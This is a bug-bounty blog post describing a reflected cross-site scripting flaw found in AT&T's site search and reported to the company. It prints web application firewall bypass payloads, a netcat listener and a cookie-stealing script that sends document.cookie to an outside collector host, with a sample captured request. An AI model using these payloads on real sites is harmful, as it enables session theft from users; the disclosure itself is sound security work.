---
title: Small Bugs, Big Bugs
date: 2021-09-09
categories: [appsec]
tags: [appsec]
excerpt: In February 2020, I decided to check out web application security programs on HackerOne.
---
## Then

In February 2020, I decided to check out web application security programs on HackerOne. I
set my eyes on AT&T for the novel fact that, in the 1960s, they almost invented the 
internet, 
but their research was prematurely halted citing costs and technical hurdles. Nonetheless, AT&T's Picturephone is a historical but often forgotten piece of history.


After burning nearly $500 million dollars on the effort, AT&T, then known as Bell Labs, scrapped the project entirely. And later, the Advanced Research Projects Agency and Department of Defense would lay claim to inventing the base technologies which would eventually grow to become the Internet.

![Picture phone!](/picturephone.jpeg)

## Now

Fast forward to today. The web is at full sprawl. It's technologies, for better or worse, are spread ubiquitously across the landscape.  Which means bugs and security vulnerabilities, of every variation, all the way down.


And I mean it with love when I say that Javascript is a lot like the new Adobe Flash. It's everywhere. And it's not going away anytime soon. So, it was both surprising and amusing to find a Javascript injection on the front page of AT&T right off the bat.

![Picture phone!](/atthome.png)


## Javascript Forever

Enumerating some of the endpoints on AT&T, I noticed AT&T's global search function.<

```plaintext
https://www.att.com/global-search/search?q=
```


Primitive payloads were filtered by the Web Application Firewall, so I started experimenting with backslashes and other weird symbols, riffing on some of the scripts similar to those in the PayloadAllTheThings repository.


Several methods slid by the WAF. The initial bypass I found was via UTF-7 encoding. And then alerts wrapped recursively in slashes, as the WAF would trim the outer string, but not the inner one, resulting in Javascript successfully firing off.

```javascript
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
```

```javascript
onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```

## Better Javascript Injection

What if we linked our endpoint and parameter with a payload that, instead of just pushing an alert, forwarded an AT&T user's cookies to our server instead?


With our EC2 running and netcat listening, `nc -lvk 80`, we could have phished for users with something like:

```javascript
onclick=alert(0)//<x//> */<script>var x=new Image;x.src="http://collector.com/c?"+document.cookie;></script>
```

```plaintext
GET /?c=ides_stack=ffdc;%20UUID=5ffed473-7499-a532-55cc-2dd805e22347;%20rxVisitor=1610536052551ME0RQ4NIKFI7HSPH1QN16E613GTL8KK5;%20dtSa=-;%20check=true;%20AMCVS_55633F7A534535110A490D44%40AdobeOrg=1;%20AMCV_55633F7A534535110A490D44%40AdobeOrg=1994364360%7CMCMID%7C45961868193201069648845035995403097869%7CMCAID%7CNONE%7CMCOPTOUT-1610543253s%7CNONE%7CvVersion%7C3.4.0;%20TLTSID=0D2C3598EC12B6969588B251277DC370;%20mbox=session HTTP/1.1
Host: 6.6.6.6
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
```


Furthermore, beyond cookie theft, we could have potentially used JavaScript injection to initialize account actions or steal authentication tokens. But registering an account required having a service contract with AT&T. So my testing stopped there. I immediately dropped AT&T a note about this and they patched shortly after.